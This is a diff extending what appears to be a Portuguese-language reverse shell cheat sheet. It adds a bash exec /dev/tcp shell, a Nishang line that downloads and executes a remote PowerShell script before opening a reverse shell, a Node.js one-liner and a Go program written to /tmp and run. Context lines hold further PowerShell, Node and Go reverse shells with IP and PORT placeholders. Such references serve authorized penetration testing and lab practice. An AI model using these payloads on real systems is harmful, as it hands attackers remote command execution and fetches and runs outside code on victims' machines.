@@ -21,6 +21,11 @@
     ```
 
     Funciona se `/dev/tcp` habilitado (bash/ksh).
+*   Alternativa (Exec):
+
+    ```shellscript
+    0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
+    ```
 
 #### NETCAT
 
@@ -139,6 +144,11 @@
     ```powershell
     $client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)};$client.Close()
     ```
+* Nishang
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
+```
 
 #### CMD (Windows Nativo)
 
@@ -186,6 +196,9 @@
     ```javascript
     (function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(PORT,"IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)});return /a/;})();
     ```
+* ```shellscript
+  node -e 'var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(<PORT>, "<IP>", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });'
+  ```
 
 #### GO
 
@@ -195,6 +208,9 @@
     package main
     import ("net";"os/exec";"io");func main(){c,_:=net.Dial("tcp","IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
     ```
+* ```shellscript
+  echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<IP>:<PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+  ```
 
 #### BusyBox
 
